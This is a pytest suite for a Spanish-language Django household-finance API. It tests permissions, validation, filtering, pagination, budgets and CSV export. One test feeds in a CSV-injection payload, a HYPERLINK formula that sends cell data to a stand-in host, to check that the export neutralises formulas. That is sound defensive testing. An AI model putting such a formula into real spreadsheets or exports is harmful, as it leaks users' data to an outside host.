import csv
import io
from datetime import date, timedelta
from decimal import Decimal

import pytest
from django.utils import timezone

from conftest import CategoriaFactory, CuentaFactory, HogarFactory, MovimientoFactory
from core.models import RegistroAuditoria
from finanzas.models import Comercio, Movimiento, Presupuesto

pytestmark = pytest.mark.django_db


@pytest.fixture
def escenario(hogar_con_roles):
    hogar, roles = hogar_con_roles
    cuenta = CuentaFactory(hogar=hogar, nombre="Común")
    comida = CategoriaFactory(hogar=hogar, nombre="Comida")
    super_ = CategoriaFactory(hogar=hogar, nombre="Súper", padre=comida)
    return hogar, roles, cuenta, comida, super_


def url(hogar, recurso="movimientos"):
    return f"/api/v1/hogares/{hogar.pk}/{recurso}/"


@pytest.mark.parametrize(
    "rol, metodo, esperado",
    [
        ("lector", "get", 200),
        ("lector", "post", 403),
        ("miembro", "post", 201),
        ("miembro", "delete", 403),
        ("admin", "delete", 204),
        ("ajeno", "get", 404),
    ],
)
def test_matriz_permisos_movimientos(cliente, escenario, rol, metodo, esperado):
    hogar, roles, cuenta, comida, _ = escenario
    c = cliente(roles[rol])
    if metodo == "get":
        r = c.get(url(hogar))
    elif metodo == "post":
        r = c.post(url(hogar), {"fecha": "2026-10-01", "importe": "-12.50", "concepto": "Pan", "cuenta": cuenta.pk})
    else:
        m = MovimientoFactory(cuenta=cuenta)
        r = c.delete(f"{url(hogar)}{m.pk}/")
    assert r.status_code == esperado, getattr(r, "data", None)


def test_no_se_puede_usar_categoria_de_otro_hogar(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    ajena = CategoriaFactory(hogar=HogarFactory())
    r = cliente(roles["miembro"]).post(
        url(hogar),
        {"fecha": "2026-10-01", "importe": "-5", "concepto": "x", "cuenta": cuenta.pk, "categoria": ajena.pk},
    )
    assert r.status_code == 400 and "categoria" in r.json()["errors"]


def test_validaciones_y_formato_de_error(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    manana = (timezone.localdate() + timedelta(days=1)).isoformat()
    r = cliente(roles["miembro"]).post(
        url(hogar), {"fecha": manana, "importe": "0", "concepto": "", "cuenta": cuenta.pk}
    )
    assert r.status_code == 400
    assert set(r.json()["errors"]) == {"fecha", "importe", "concepto"}


def test_crear_reconoce_comercio_y_audita(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    Comercio.objects.create(nombre="Mercadona")
    r = cliente(roles["miembro"]).post(
        url(hogar),
        {
            "fecha": "2026-10-01",
            "importe": "-30",
            "concepto": "MERCADONA SA 0042",
            "cuenta": cuenta.pk,
            "etiquetas": ["Casa ", "casa", "Mes"],
        },
    )
    assert r.status_code == 201
    assert r.json()["comercio"]["nombre"] == "Mercadona"
    assert r.json()["etiquetas"] == ["casa", "mes"]
    assert RegistroAuditoria.objects.filter(accion="crear", usuario=roles["miembro"]).count() == 1


def test_filtros_categoria_padre_incluye_hijas_y_tipo(cliente, escenario):
    hogar, roles, cuenta, comida, super_ = escenario
    MovimientoFactory(cuenta=cuenta, categoria=comida, importe=Decimal("-1"))
    MovimientoFactory(cuenta=cuenta, categoria=super_, importe=Decimal("-2"))
    MovimientoFactory(cuenta=cuenta, importe=Decimal("100"))
    c = cliente(roles["lector"])
    assert len(c.get(url(hogar), {"categoria": comida.pk}).json()["results"]) == 2
    assert len(c.get(url(hogar), {"tipo": "ingreso"}).json()["results"]) == 1
    assert len(c.get(url(hogar), {"sin_categoria": "true"}).json()["results"]) == 1


def test_paginacion_por_cursor_y_ordenacion(cliente, escenario):
    hogar, roles, cuenta, *_ = escenario
    for i in range(60):
        MovimientoFactory(cuenta=cuenta, fecha=date(2026, 1, 1) + timedelta(days=i))
    c = cliente(roles["lector"])
    p1 = c.get(url(hogar)).json()
    assert len(p1["results"]) == 50 and p1["next"] and "cursor=" in p1["next"]
    p2 = c.get(p1["next"]).json()
    assert len(p2["results"]) == 10
    assert p1["results"][0]["fecha"] == "2026-03-01"  # el más reciente primero
    por_importe = c.get(url(hogar), {"ordering": "importe"}).json()
    assert "count" in por_importe  # con ordering: paginación numérica


def test_listado_consultas_constantes(cliente, escenario, django_assert_num_queries):
    hogar, roles, cuenta, comida, _ = escenario
    c = cliente(roles["lector"])
    MovimientoFactory.create_batch(3, cuenta=cuenta, categoria=comida)
    # La primera petición del proceso consulta además el ContentType de Movimiento (para los adjuntos) y lo
    # guarda en la caché de ContentType: sin calentarla, el test pasaba o fallaba según qué test corriera antes.
    c.get(url(hogar))
    with django_assert_num_queries(2) as capturadas:  # membresía + movimientos
        c.get(url(hogar))
    MovimientoFactory.create_batch(30, cuenta=cuenta, categoria=comida)
    with django_assert_num_queries(len(capturadas)):
        c.get(url(hogar))


def test_recategorizar_en_bloque_solo_del_hogar(cliente, escenario):
    hogar, roles, cuenta, comida, _ = escenario
    mios = MovimientoFactory.create_batch(3, cuenta=cuenta, revisado=False)
    ajeno = MovimientoFactory()
    r = cliente(roles["miembro"]).post(
        f"{url(hogar)}recategorizar/", {"ids": [m.pk for m in mios] + [ajeno.pk], "categoria": comida.pk}
    )
    assert r.json() == {"actualizados": 3}
    ajeno.refresh_from_db()
    assert ajeno.categoria_id is None


def test_exportar_csv(cliente, escenario):
    hogar, roles, cuenta, comida, _ = escenario
    MovimientoFactory(cuenta=cuenta, concepto="Pan", importe=Decimal("-1.20"), categoria=comida, etiquetas=["casa"])
    r = cliente(roles["lector"]).get(f"{url(hogar)}exportar/")
    contenido = b"".join(r.streaming_content).decode()
    assert r["Content-Type"].startswith("text/csv")
    assert "Pan;-1,20;Común;Comida;casa" in contenido


def test_exportar_csv_sin_formulas(cliente, escenario):
    """CSV injection: un concepto del banco que empieza por "=" se abre como texto, no como fórmula."""
    hogar, roles, cuenta, *_ = escenario
    concepto = '=HYPERLINK("https://ejemplo.test/?d="&A2;"Ver")'
    MovimientoFactory(cuenta=cuenta, concepto=concepto, importe=Decimal("-12.50"), etiquetas=["@casa", "viaje"])
    r = cliente(roles["lector"]).get(f"{url(hogar)}exportar/")
    filas = list(csv.reader(io.StringIO(b"".join(r.streaming_content).decode()), delimiter=";"))
    assert filas[1][1:] == ["'" + concepto, "-12,50", "Común", "", "'@casa,viaje"]  # el importe, sin apóstrofo


def test_presupuesto_con_gastado_incluye_subcategorias(cliente, escenario):
    hogar, roles, cuenta, comida, super_ = escenario
    Presupuesto.objects.create(hogar=hogar, categoria=comida, mes=date(2026, 10, 1), importe=Decimal("100"))
    MovimientoFactory(cuenta=cuenta, categoria=comida, fecha=date(2026, 10, 5), importe=Decimal("-20"))
    MovimientoFactory(cuenta=cuenta, categoria=super_, fecha=date(2026, 10, 31), importe=Decimal("-30"))
    MovimientoFactory(cuenta=cuenta, categoria=super_, fecha=date(2026, 11, 1), importe=Decimal("-99"))
    r = cliente(roles["lector"]).get(url(hogar, "presupuestos"), {"mes": "2026-10"})
    assert r.json()[0]["gastado"] == "-50.00" and r.json()[0]["porcentaje"] == 50


def test_saldo_de_cuentas_y_reordenar_categorias(cliente, escenario):
    hogar, roles, cuenta, comida, super_ = escenario
    MovimientoFactory(cuenta=cuenta, importe=Decimal("1000"))
    MovimientoFactory(cuenta=cuenta, importe=Decimal("-250.5"))
    assert cliente(roles["lector"]).get(url(hogar, "cuentas")).json()[0]["saldo"] == "749.50"
    r = cliente(roles["miembro"]).post(f"{url(hogar, 'categorias')}reordenar/", {"ids": [super_.pk, comida.pk]})
    assert r.status_code == 204
    super_.refresh_from_db()
    assert super_.orden == 0
    assert Movimiento.objects.count() == 2
